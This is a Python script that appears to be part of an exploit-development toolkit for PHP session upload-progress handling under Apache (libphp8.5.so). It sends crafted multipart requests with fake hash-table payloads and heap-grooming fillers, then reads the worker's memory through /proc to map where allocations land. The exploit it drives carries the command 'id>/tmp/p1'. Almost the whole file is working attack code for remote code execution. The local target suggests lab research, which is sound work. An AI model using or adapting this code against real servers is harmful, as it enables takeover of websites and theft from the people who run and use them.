#!/usr/bin/env python3
"""Measure live stage-3 B allocations at php_session_track_init()."""

from __future__ import annotations

import argparse
import os
import signal
import struct
import subprocess
import threading
import time

import exploit


MODULE = "/usr/lib/apache2/modules/libphp8.5.so"
PS_GLOBALS = 0x991FE0
PS_HTTP_SESSION_VARS = 0x168


def worker_pid(target: exploit.Target) -> int:
    for _ in range(40):
        output = subprocess.check_output(
            ["sh", "-c", "pgrep -P 1 apache2 | head -1"],
            text=True,
        ).strip()
        if output:
            pid = int(output)
            if os.path.exists(f"/proc/{pid}/maps"):
                return pid
        target.get("/")
        time.sleep(0.05)
    raise RuntimeError("Apache worker did not respawn")


def process_state(pid: int) -> str:
    with open(f"/proc/{pid}/stat", "r", encoding="ascii") as stat_file:
        return stat_file.read().split()[2]


def module_base(pid: int) -> int:
    with open(f"/proc/{pid}/maps", "r", encoding="ascii") as maps:
        for line in maps:
            if line.rstrip().endswith(MODULE):
                return int(line.split("-", 1)[0], 16)
    raise RuntimeError("libphp mapping not found")


def read_memory(pid: int, address: int, size: int) -> bytes:
    with open(f"/proc/{pid}/mem", "rb", buffering=0) as memory:
        memory.seek(address)
        return memory.read(size)


def run_until_idle(thread: threading.Thread, pid: int) -> None:
    while thread.is_alive():
        if process_state(pid) == "T":
            os.kill(pid, signal.SIGCONT)
        time.sleep(0.02)
    thread.join()


def start_request(
    target: exploit.Target,
    body: bytes,
    boundary: bytes,
    extra_headers: dict[str, str] | None = None,
) -> threading.Thread:
    def send() -> None:
        target.post(
            body,
            boundary,
            read_cap=65536,
            timeout=40.0,
            extra_headers=extra_headers,
        )

    thread = threading.Thread(target=send, daemon=True)
    thread.start()
    return thread


def stage3_a_body(ex: exploit.Exploit) -> bytes:
    parts = [
        {"name": "PHPSESSID", "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for index, (name_length, value_length) in enumerate(ex.stage3_pads):
        name = (
            f"p{index:0{name_length - 1}d}" if name_length > 0 else ""
        )[:name_length]
        parts.append({"name": name, "data": b"V" * value_length})
    parts.extend([ex._file_part(), ex._big_field()])
    return exploit.build_multipart(parts, b"S" * 17)


def stage3_b_body(
    ex: exploit.Exploit,
    htdata: int,
    fillers: int,
    filler_value_length: int,
    carrier_length: int,
    spacer_length: int,
    short_fillers: int,
    single_bin6: int,
    ht_count: int,
    ht_first: bool,
) -> bytes:
    fake_ht, _ = ex._fake_payload(htdata, htdata + 0x100)
    mutable_ht = bytearray(fake_ht)
    mutable_ht[0x60:0x67] = b"MARK855"
    def carrier(marker: bytes) -> bytes:
        return (marker + b"Z" * max(0, carrier_length - len(marker)))[
            :carrier_length
        ]

    parts = [
        {"name": "PHPSESSID", "data": exploit.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(fillers):
        value_length = 7 if index < short_fillers else filler_value_length
        parts.append(
            {"name": f"x{index:04d}", "data": b"Z" * value_length}
        )
    if spacer_length:
        parts.append({"name": "spacer", "data": b"S" * spacer_length})
    for index in range(single_bin6):
        parts.append(
            {
                "name": f"pf{index:02d}",
                "filename": "F" * 23,
                "data": b"",
            }
        )
    ht_parts = [
        {"name": f"a{index:030d}"[:31], "data": bytes(mutable_ht)}
        for index in range(ht_count)
    ]
    if ht_first:
        parts.extend(ht_parts)
    parts.extend(
        [
            {"name": "f00", "data": carrier(b"F00MARK")},
            {"name": "f01", "data": carrier(b"F01MARK")},
            {"name": "g00", "data": carrier(b"G00MARK")},
        ]
    )
    if not ht_first:
        parts.extend(ht_parts)
    return exploit.build_multipart(parts, b"B" * 10)


def marker_offsets(memory: bytes, marker: bytes) -> list[int]:
    result = []
    start = 0
    while True:
        position = memory.find(marker, start)
        if position < 0:
            return result
        result.append(position)
        start = position + 1


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--stop", type=int, default=722)
    parser.add_argument("--step", type=int, default=50)
    parser.add_argument("--filler-value-length", type=int, default=15)
    parser.add_argument("--carrier-length", type=int, default=15)
    parser.add_argument("--a-pad-count", type=int, default=6)
    parser.add_argument("--short-fillers", type=int, default=0)
    parser.add_argument("--single-bin6", type=int, default=0)
    parser.add_argument("--ht-count", type=int, default=15)
    parser.add_argument("--ht-first", action="store_true")
    parser.add_argument("--spacer-start", type=int, default=0)
    parser.add_argument("--spacer-stop", type=int, default=0)
    parser.add_argument("--spacer-step", type=int, default=256)
    parser.add_argument("--keep-stopped", action="store_true")
    args = parser.parse_args()

    target = exploit.Target("http://127.0.0.1/index.php", verbose=False)
    ex = exploit.Exploit(target, "id>/tmp/p1", profile="bookworm", verbose=False)
    ex.stage3_pads = [(8, 7)] * args.a_pad_count

    spacer_values = range(
        args.spacer_start,
        args.spacer_stop + 1,
        args.spacer_step,
    )
    for fillers in range(args.start, args.stop + 1, args.step):
        for spacer_length in spacer_values:
            pid = worker_pid(target)
            base = module_base(pid)
            ps = base + PS_GLOBALS

            a_thread = start_request(
                target,
                stage3_a_body(ex),
                b"S" * 17,
                {"Cookie": "PHPSESSID=" + "a" * 32},
            )
            run_until_idle(a_thread, pid)
            time.sleep(0.1)

            r0 = struct.unpack(
                "<Q",
                read_memory(pid, ps + PS_HTTP_SESSION_VARS, 8),
            )[0]
            if not exploit.userspace_pointer(r0):
                raise RuntimeError(f"fillers={fillers}: invalid R0 after A: {r0:#x}")
            chunk = r0 & ~0x1FFFFF
            b_thread = start_request(
                target,
                stage3_b_body(
                    ex,
                    chunk + 0x690D8,
                    fillers,
                    args.filler_value_length,
                    args.carrier_length,
                    spacer_length,
                    args.short_fillers,
                    args.single_bin6,
                    args.ht_count,
                    args.ht_first,
                ),
                b"B" * 10,
            )

            deadline = time.monotonic() + 10.0
            while process_state(pid) != "T" and time.monotonic() < deadline:
                time.sleep(0.01)
            if process_state(pid) != "T":
                raise RuntimeError(f"fillers={fillers}: track_init trap not reached")

            memory = read_memory(pid, chunk, 0x200000)
            f00 = marker_offsets(memory, b"F00MARK")
            f01 = marker_offsets(memory, b"F01MARK")
            g00 = marker_offsets(memory, b"G00MARK")
            tables = marker_offsets(memory, b"MARK855")
            print(
                f"fillers={fillers} short={args.short_fillers} "
                f"single6={args.single_bin6} spacer={spacer_length} "
                f"chunk=0x{chunk:x} r0=0x{r0 - chunk:x} "
                f"f00={','.join(hex(x) for x in f00[:4])} "
                f"f01={','.join(hex(x) for x in f01[:4])} "
                f"g00={','.join(hex(x) for x in g00[:4])} "
                f"tables={','.join(hex(x - 0x60) for x in tables[:8])}",
                flush=True,
            )
            if args.keep_stopped:
                return 0

            run_until_idle(b_thread, pid)
            time.sleep(0.1)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
